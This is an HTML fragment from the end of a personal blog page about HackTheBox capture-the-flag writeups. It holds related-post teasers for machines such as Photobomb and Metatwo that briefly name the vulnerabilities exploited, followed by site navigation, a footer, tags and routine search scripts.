Linux con una aplicación en un servidor web con Python que permitía en uno de sus archivos implementar una funcionalidad agregando una nueva ruta para explotar RCE (Remote code execution) a...</p></div></div></a></div><div class="card"> <a href="/posts/HTBPhotobomb/"><div class="card-body"> <em class="timeago small" data-ts="1667426116" > 2022-11-02 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Photobomb</h3><div class="text-muted small"><p> Overview Http authentication credentials by Information leak in a server file Command Inyection by unsanitized user input on file download (Foothold) Path Hijacking to remote command execut...</p></div></div></a></div><div class="card"> <a href="/posts/HTBMetaTwo/"><div class="card-body"> <em class="timeago small" data-ts="1668574637" > 2022-11-15 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Metatwo</h3><div class="text-muted small"><p> Overview Worpress credentials by Unauthenticated SQL Injection (CVE-2022-0739) FTP credentials by Authenticated XXE Within the Media Library (CVE-2021-29447) SSH login by Information leak i...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTBRedpanda/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox Writeup Redpanda</p></a> <a href="/posts/HTBUpdown/" class="btn btn-outline-primary" prompt="Newer"><p>Hackthebox Writeup Updown</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/username">Marsello Guillén</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
